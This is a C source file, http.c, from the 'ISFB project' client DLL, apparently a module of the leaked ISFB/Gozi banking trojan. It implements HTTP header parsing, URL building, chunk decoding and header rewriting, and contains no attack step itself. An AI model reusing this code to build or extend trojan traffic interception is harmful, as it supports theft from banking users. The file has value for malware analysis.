//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: http.c
// $Revision: 399 $
// $Date: 2014-11-17 18:46:20 +0300 (Пн, 17 ноя 2014) $
// description:
//	ISFB client DLL. Lightweight HTTP Parser.


#include "..\common\common.h"
#include "http.h"

#define CHUNK_SIZE_BYTES	8

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Checks if specified buffer may contain HTTP request.
//
BOOL HttpIsRequest(PCHAR Buffer, ULONG Size)
{
	BOOL Ret = FALSE;
	if (Size > sizeof(ULONG))
	{
		ULONG	Method = *(PULONG)Buffer;
		if (Method == uGET || Method == uPUT || Method == uPOST)
			Ret = TRUE;
	}
	return(Ret);
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Checks if specified buffer may contain HTTP reply.
//
BOOL HttpIsReply(PCHAR Buffer, ULONG Size)
{
	BOOL Ret = FALSE;
	if (Size > sizeof(ULONG))
	{
		ULONG	Method = *(PULONG)Buffer;
		if (Method == uHTTP || Method == uPOST)
			Ret = TRUE;
	}
	return(Ret);
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Allocates and initializes HTTP_HEADERS structure. 
//
PHTTP_HEADERS	HttpAllocHeaders(
						ULONG	SizeOfBinary	// size of binary buffer containing headers' strings
						)
{
	PHTTP_HEADERS	Headers = NULL;
	PCHAR	Binary;

	if (Binary = hAlloc(SizeOfBinary + 1))
	{
		if (Headers = (PHTTP_HEADERS)hAlloc(sizeof(HTTP_HEADERS)))
		{
			memset(Headers, 0, sizeof(HTTP_HEADERS));
			Binary[SizeOfBinary] = 0;
			Headers->Binary = Binary;
#if _DEBUG
			Headers->Magic = HTTP_HEADERS_MAGIC;
#endif
		}	// if (Headers = (PHTTP_HEADERS)hAlloc(sizeof(HTTP_HEADERS)))
		else
			hFree(Binary);
	}	// if (Binary = hAlloc(SizeOfBinary))
	return(Headers);
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Releases specified HTTP_HEADERS structure. Frees memory.
//
VOID HttpReleaseHeaders(PHTTP_HEADERS Headers)
{
	ASSERT_HTTP_HEADERS(Headers);

	if (Headers->Url)
		hFree(Headers->Url);
	if (Headers->Binary)
		hFree(Headers->Binary);
	
	hFree(Headers);
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Returns pointer of the first null-terminated char string from the buffer of strings devided by "\r\n"
//
PCHAR BufferGetString(PCHAR* Buffer)
{
	PCHAR pStr = NULL, eStr = StrChr(*Buffer, '\r');
	if (eStr)
	{
		pStr = *Buffer;
		eStr[0] = 0;
		*Buffer = eStr + 2;
	}
	return(pStr);
}


PCHAR	strzero(PCHAR Str)
{
	while(Str[0] == ' ')
		Str += 1;

	return(Str);
}


//
//	Searches specified Headers for the header with specified Name.
//	Returns pointer to the specified header's value if found.
//
PCHAR HttpFindHeader(
	IN	LPSTR	Headers,	// NULL-terminated string containing HTTP headers devided by CRLF	
	IN	LPSTR	Name,		// name of the header whos value to search
	OUT	PULONG	pSize		// receives size of the found value
	)
{
	PCHAR	aStr = Headers, bStr, FoundStr = NULL;
	ULONG	cLen = lstrlen(Name);

	while(*(PUSHORT)aStr != '\r\n')
	{
		bStr = StrChr(aStr, '\r') + 2;
		if (StrCmpNI(aStr, Name, cLen) == 0)
		{
			FoundStr = strzero(aStr + (cLen + 1));
			if (pSize)
				*pSize = (ULONG)(bStr - FoundStr - 2);

			break;
		}
		aStr = bStr;
	}

	return(FoundStr);
}

//
//	Searches specified Headers for the header with specified Name.
//	Returns pointer to the specified header's value if found.
//
LPSTR HttpFindHeaderA(
	IN	LPSTR	Headers,	// NULL-terminated string containing HTTP headers devided by CRLF	
	IN	LPSTR	Name,		// name of the header whos value to search
	OUT	PULONG	pLen		// receives size of the found value in chars
	)
{
	LPSTR	aStr, bStr;
	ULONG	cLen = lstrlenA(Name);

	if (aStr = StrStrIA(Headers, Name))
	{
		aStr += cLen;

		while(aStr[0] == ' ')
			aStr += 1;

		if (pLen)
		{
			if (bStr = StrChrA(aStr, '\r'))
				cLen = (ULONG)(bStr - aStr);
			else
				cLen = lstrlenA(aStr);
			*pLen = cLen;
		}
	}	// if (aStr = StrStrIA(Headers, Name))

	return(aStr);
}


//
//	Searches specified Headers for the header with specified Name.
//	Returns pointer to the specified header's value if found.
//
LPWSTR HttpFindHeaderW(
	IN	LPWSTR	Headers,	// NULL-terminated string containing HTTP headers devided by CRLF	
	IN	LPWSTR	Name,		// name of the header whos value to search
	OUT	PULONG	pLen		// receives size of the found value in chars
	)
{
	LPWSTR	aStr, bStr;
	ULONG	cLen = lstrlenW(Name);

	if (aStr = StrStrIW(Headers, Name))
	{
		aStr += cLen;

		while(aStr[0] == L' ')
			aStr += 1;

		if (pLen)
		{
			if (bStr = StrChrW(aStr, L'\r'))
				cLen = (ULONG)(bStr - aStr);
			else
				cLen = lstrlenW(aStr);
			*pLen = cLen;
		}
	}	// if (aStr = StrStrIW(Headers, Name))

	return(aStr);
}



//
//	Searches specified HTTP headers buffer for HOST and URI fields and builds an URL.
//
PCHAR HttpQueryUrl(
	PHTTP_HEADERS	Headers,		// buffer containing HTTP headers (see HTTP specification)
	BOOL			bIsSsl
	)
{
	PCHAR	Prefix, Uri, Host, cStr = NULL;
	ULONG	PrefixLen, UriLen, HostLen;

	do	// not a loop
	{
		if (!(Uri = StrChr(Headers->Binary, ' ')))
			break;

		Uri += 1;

		if (!(cStr = StrChr(Uri,' ')))
			break;

		UriLen = (ULONG)(cStr - Uri);

		if (!(Host = HttpFindHeaderA(Headers->Binary, szHost, &HostLen)))
			break;
		if (!(cStr = (PCHAR)hAlloc(cstrlen(szHttps) + HostLen + UriLen + 1)))
			break;

		if (bIsSsl)
		{
			Prefix = szHttps;
			PrefixLen = cstrlen(szHttps);
		}
		else
		{
			Prefix = szHttp;
			PrefixLen = cstrlen(szHttp);
		}

		memcpy(cStr, Prefix, PrefixLen);
		memcpy(cStr + PrefixLen, Host, HostLen);
		memcpy(cStr + PrefixLen + HostLen, Uri, UriLen);
		cStr[HostLen + PrefixLen + UriLen] = 0;

	} while(FALSE);

	return(cStr);
}


/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Searches specified HTTP headers buffer for a User-Agent header and returns pointer to the header data.
//
PCHAR HttpQueryAgent(
			 PHTTP_HEADERS	Headers		// buffer containing HTTP headers (see HTTP specification)
			 )
{
	PCHAR Agent, cStr = NULL;
	ULONG AgentLen;
	if ((Agent = HttpFindHeaderA(Headers->Binary, szUserAgent, &AgentLen)))
	{		
		if ((cStr = (PCHAR)hAlloc(AgentLen + 1)))
		{
			lstrcpyn(cStr, Agent, AgentLen+1);
			cStr[AgentLen] = 0;
		}
	}
	return(cStr);
}


//
//	Returns pointer to a chunk data and it's size in bytes.
//
PCHAR HttpGetChunk(
	IN	PCHAR	ChunkHeader,	// pointer to chunk header
	OUT	PULONG	pChunkSize		// receives size of the chunk
	)
{
	CHAR cStr[CHUNK_SIZE_BYTES + 1 + 2] = {0};	// 1 for zero, 2 for "0x"
	PCHAR Chunk = NULL, aStr = StrStr(ChunkHeader, szCRLF);
	if (aStr)
	{
		ULONG vSize = (ULONG)(aStr - ChunkHeader);
		if (vSize <= CHUNK_SIZE_BYTES)
		{
			*(PUSHORT)cStr = 'x0';
			memcpy(&cStr[2], ChunkHeader, vSize);
			if (StrToIntEx(cStr, STIF_SUPPORT_HEX, &vSize))
			{
				Chunk = aStr+2;		// skipping "\r\n"
				*pChunkSize = vSize;
			}
		}	// if (vSize <= CHUNK_SIZE_BYTES)
	}	// if (aStr)
	return(Chunk);
}
			

//
//	Tries to parse specified buffer as HTTP request or reply.
//
PHTTP_HEADERS	HttpParseHeaders(
	PCHAR Buffer, 
	ULONG HeadersSize
	)
{
	PHTTP_HEADERS	Headers;

	if (Headers = HttpAllocHeaders(HeadersSize))
	{
		Headers->HeadersSize = HeadersSize;
		memcpy(Headers->Binary, Buffer, HeadersSize);
		ASSERT(Headers->Binary[HeadersSize] == 0);

		if (HttpIsReply(Headers->Binary, Headers->HeadersSize))
		{
			PCHAR	Content;
			ULONG	ContentLen;

			// Reading HTTP request status
			if (HeadersSize >= (HTTP_VERSION_LENGTH + sizeof(ULONG)))
				Headers->Status = *(PULONG)(Headers->Binary + HTTP_VERSION_LENGTH);

			// Determine content length
			if (Content = HttpFindHeaderA(Headers->Binary, szContentLength, &ContentLen))
			{
				// Has Content-Length field
				ASSERT(Content[ContentLen] == '\r');
				Content[ContentLen] = 0;
				Headers->ContentSize = (StrToInt(Content));	
				Content[ContentLen] = '\r';
				Headers->Flags |= CF_LENGTH;
			}

			// Resolve HTTP encoding
			if ((Content = HttpFindHeaderA(Headers->Binary, szTransferEncoding, NULL)) && (*(PULONG)Content == uChunked))
			{
				//Content is chunked
				Headers->Flags |= CF_CHUNKED;
			}
		}	// if (HttpIsReply(Headers->Binary, Headers->HeadersSize))

		// Resolve HTTP Referer
		Headers->pReferer = HttpFindHeaderA(Headers->Binary, szReferer, &Headers->RefererSize);

	}	// if (Headers = HttpAllocHeaders(HeadersSize))
		
	return(Headers);
}

//
//	Searches for the specifed HTTP-header and sets a new value for it.
//	If there's no specified header found this function adds it.
//	If the specified value is NULL the function removes the specified header.
//  HTTP-header name is case-insensitive.
//
LPSTR HttpSetHeaderA(
	LPCSTR Headers,		// buffer containing NULL-terminated HTTP-headers
	LPCSTR HeaderName,	// header name to set
	LPCSTR HeaderValue,	// new value for the header
	LPCSTR Delimeter	// delimiter for HTTP-headers
	)
{
	LPSTR	pStart, pEnd = NULL, NewHeaders = NULL;
	ULONG	ValueLen = 0, NameLen = lstrlenA(HeaderName), HeadersLen = lstrlenA(Headers);
	ULONG	Size0, Size1, NewLen = 0;

	do	// not a loop
	{
		if (pStart = StrStrIA(Headers, HeaderName))
		{
			if (Delimeter)
				pEnd = StrStrIA(pStart, Delimeter);
			else if (pEnd = StrStrIA(pStart, szCRLF))
				pEnd += cstrlenA(szCRLF);
			else
				pEnd = (LPSTR)Headers + HeadersLen;

			Size0 = (ULONG)(pStart - Headers);
			Size1 = HeadersLen - (ULONG)(pEnd - Headers);
		}
		else
		{
			Size0 = HeadersLen - cstrlenA(szCRLF);
			Size1 = cstrlenA(szCRLF);
			pEnd = (LPSTR)Headers + Size0;
		}

		if (HeaderValue)
		{
			ValueLen = lstrlenA(HeaderValue);
			NewLen = NameLen + ValueLen + cstrlenA(szCRLF);			
		}
		else if (!pStart)
			break;

		if (NewHeaders = hAlloc((Size0 + NewLen + Size1 + 1) * sizeof(UCHAR)))
		{
			memcpy(NewHeaders, Headers, Size0);
			if (NewLen)
			{
				memcpy(NewHeaders + Size0, HeaderName, NameLen);
				Size0 += NameLen;
				memcpy(NewHeaders + Size0, HeaderValue, ValueLen);
				Size0 += ValueLen;
				memcpy(NewHeaders + Size0, szCRLF, cstrlenA(szCRLF));
				Size0 += cstrlenA(szCRLF);
			}
			memcpy(NewHeaders + Size0, pEnd, Size1);
			NewHeaders[Size0 + Size1] = 0;
		}	// if (NewHeaders = hAlloc((Size0 + NewLen + Size1 + 1) * sizeof(UCHAR)))
	} while(FALSE);

	return(NewHeaders);
}


LPWSTR HttpSetHeaderW(LPCWSTR Headers, LPCSTR HeaderName, LPCSTR HeaderValue)
{
	LPSTR	NewA, NewMod;
	LPWSTR	NewW = NULL;
	ULONG	HeadersLen = lstrlenW(Headers);

	if (NewA = hAlloc(HeadersLen + sizeof(UCHAR)))
	{
		wcstombs(NewA, Headers, HeadersLen + 1);
		NewMod = HttpSetHeaderA((LPCSTR)NewA, HeaderName, HeaderValue, NULL);
		hFree(NewA);

		if (NewMod)
		{
			HeadersLen = lstrlenA(NewMod);
			if (NewW = hAlloc((HeadersLen + 1) * sizeof(WCHAR)))
				mbstowcs(NewW, NewMod, HeadersLen + 1);

			hFree(NewMod);
		}	// if (NewMod)
	}	// if (NewA = hAlloc(HeadersLen + sizeof(UCHAR)))

	return(NewW);
}

LPSTR	StrStrNA(
	LPSTR	Source,
	LPSTR	Search,
	LONG	Length
	)
{
	LONG	i, SearchLen = lstrlen(Search);
	LPSTR	Result = NULL;

	Length -= SearchLen - 1;

	for (i=0; i < Length; i++)
	{
		if ((Source[i] == Search[0]) && !StrCmpNA(&Source[i], Search, SearchLen))
		{
			Result = &Source[i];
			break;
		}
	}
	return(Result);
}
